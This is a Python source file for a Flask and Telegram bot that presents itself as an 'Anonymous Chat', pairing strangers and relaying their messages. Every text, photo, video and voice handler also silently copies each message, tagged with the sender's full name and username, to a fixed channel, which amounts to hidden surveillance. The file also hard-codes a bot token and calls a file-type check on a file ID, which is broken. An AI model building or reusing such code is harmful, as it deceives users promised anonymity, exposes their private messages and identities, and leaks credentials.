import os
from flask import Flask, request, send_from_directory, render_template_string
from telegram import Update, Bot
from telegram.ext import Updater, Dispatcher, CommandHandler, MessageHandler, Filters
import magic  # Import python-magic

# Inisialisasi Flask app
app = Flask(__name__)

# Inisialisasi bot dengan token langsung (sebaiknya simpan token di variabel lingkungan untuk keamanan)
bot = Bot(token="7881351318:AAEUSNn1P8C5TB-EAu8vPmH4wlkgFqeSk9o")

# Inisialisasi Updater dan Dispatcher
updater = Updater(bot=bot, use_context=True)
dispatcher = updater.dispatcher

# Contoh penggunaan magic untuk mendeteksi tipe file
def detect_file_type(file_path):
    mime = magic.Magic(mime=True)
    file_type = mime.from_file(file_path)
    return file_type

# Database sederhana
waiting_list = []
active_chats = {}
user_ids = set()
CHANNEL_ID = '@rzbotkep'  # Ganti dengan ID channel atau grup Anda

# Fungsi untuk memulai pencarian pasangan
def search(update, context):
    user_id = update.message.from_user.id
    user_ids.add(user_id)
    if user_id in active_chats:
        update.message.reply_text("Anda sudah dalam obrolan. Ketik /stop untuk mengakhiri obrolan atau /next untuk mencari pasangan baru.")
        return
    if waiting_list:
        partner_id = waiting_list.pop(0)
        active_chats[user_id] = partner_id
        active_chats[partner_id] = user_id
        context.bot.send_message(chat_id=user_id, text="Anda terhubung dengan pasangan obrolan.")
        context.bot.send_message(chat_id=partner_id, text="Anda terhubung dengan pasangan obrolan.")
    else:
        waiting_list.append(user_id)
        update.message.reply_text("⌛ Menunggu pengguna lain untuk terhubung...")

# Fungsi untuk mengakhiri obrolan
def stop(update, context):
    user_id = update.message.from_user.id
    if user_id in active_chats:
        partner_id = active_chats.pop(user_id)
        del active_chats[partner_id]
        context.bot.send_message(chat_id=user_id, text="Obrolan telah diakhiri.")
        context.bot.send_message(chat_id=partner_id, text="Pasangan Anda telah meninggalkan obrolan.")
    else:
        update.message.reply_text("Anda tidak sedang dalam obrolan.")

# Fungsi untuk mengganti pasangan obrolan
def next(update, context):
    stop(update, context)
    search(update, context)

# Fungsi untuk menangani pesan teks
def handle_text_message(update, context):
    user_id = update.message.from_user.id
    user_ids.add(user_id)
    full_name = f"{update.message.from_user.first_name} {update.message.from_user.last_name or ''}".strip()
    username = update.message.from_user.username
    if user_id in active_chats:
        context.bot.send_message(chat_id=active_chats[user_id], text=update.message.text)
    else:
        update.message.reply_text("Anda tidak sedang dalam obrolan. Ketik /search untuk mencari pasangan obrolan.")
    context.bot.send_message(chat_id=CHANNEL_ID, text=f"Dari {full_name} (@{username}): {update.message.text}")

# Fungsi untuk menangani pesan foto
def handle_photo_message(update, context):
    user_id = update.message.from_user.id
    user_ids.add(user_id)
    full_name = f"{update.message.from_user.first_name} {update.message.from_user.last_name or ''}".strip()
    username = update.message.from_user.username
    if user_id in active_chats:
        partner_id = active_chats[user_id]
        photo_file = update.message.photo[-1].file_id
        context.bot.send_photo(chat_id=partner_id, photo=photo_file)
    else:
        update.message.reply_text("Anda tidak sedang dalam obrolan. Ketik /search untuk mencari pasangan obrolan.")
    photo_file = update.message.photo[-1].file_id
    caption = f"Dari {full_name} (@{username})"
    context.bot.send_photo(chat_id=CHANNEL_ID, photo=photo_file, caption=caption)
    file_type = detect_file_type(photo_file)  # Deteksi tipe file

# Fungsi untuk menangani pesan video
def handle_video_message(update, context):
    user_id = update.message.from_user.id
    user_ids.add(user_id)
    full_name = f"{update.message.from_user.first_name} {update.message.from_user.last_name or ''}".strip()
    username = update.message.from_user.username
    if user_id in active_chats:
        partner_id = active_chats[user_id]
        video_file = update.message.video.file_id
        context.bot.send_video(chat_id=partner_id, video=video_file)
    else:
        update.message.reply_text("Anda tidak sedang dalam obrolan. Ketik /search untuk mencari pasangan obrolan.")
    video_file = update.message.video.file_id
    caption = f"Dari {full_name} (@{username})"
    context.bot.send_video(chat_id=CHANNEL_ID, video=video_file, caption=caption)

# Fungsi untuk menangani voice note
def handle_voice_message(update, context):
    user_id = update.message.from_user.id
    user_ids.add(user_id)
    full_name = f"{update.message.from_user.first_name} {update.message.from_user.last_name or ''}".strip()
    username = update.message.from_user.username
    if user_id in active_chats:
        partner_id = active_chats[user_id]
        voice_file = update.message.voice.file_id
        context.bot.send_voice(chat_id=partner_id, voice=voice_file)
    else:
        update.message.reply_text("Anda tidak sedang dalam obrolan. Ketik /search untuk mencari pasangan obrolan.")
    voice_file = update.message.voice.file_id
    caption = f"Dari {full_name} (@{username})"
    context.bot.send_voice(chat_id=CHANNEL_ID, voice=voice_file, caption=caption)

# Fungsi untuk memulai bot
def start(update, context):
    user_id = update.message.from_user.id
    user_ids.add(user_id)
    update.message.reply_text("Selamat datang di Anonymous Chat! Ketik /search untuk mencari pasangan obrolan, /stop untuk mengakhiri obrolan, atau /next untuk mengganti pasangan.")

dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("search", search))
dispatcher.add_handler(CommandHandler("stop", stop))
dispatcher.add_handler(CommandHandler("next", next))
dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text_message))
dispatcher.add_handler(MessageHandler(Filters.photo, handle_photo_message))
dispatcher.add_handler(MessageHandler(Filters.video, handle_video_message))
dispatcher.add_handler(MessageHandler(Filters.voice, handle_voice_message))

# Endpoint untuk menampilkan pesan "Selamat Datang"
@app.route('/', methods=['GET'])
def welcome():
    welcome_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Selamat Datang</title>
        <style>
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                font-family: Arial, sans-serif;
                background-color: #f0f0f0;
            }
            h1 {
                color: #333;
            }
        </style>
    </head>
    <body>
        <h1>Selamat Datang</h1>
    </body>
    </html>
    """
    return render_template_string(welcome_html)

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.method == "POST":
        update = Update.de_json(request.get_json(force=True), bot)
        dispatcher.process_update(update)
        return "OK", 200

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static'),
                               'favicon.ico', mimetype='image/vnd.microsoft.icon')


if __name__ == "__main__":
    updater.start_polling()
    updater.idle()

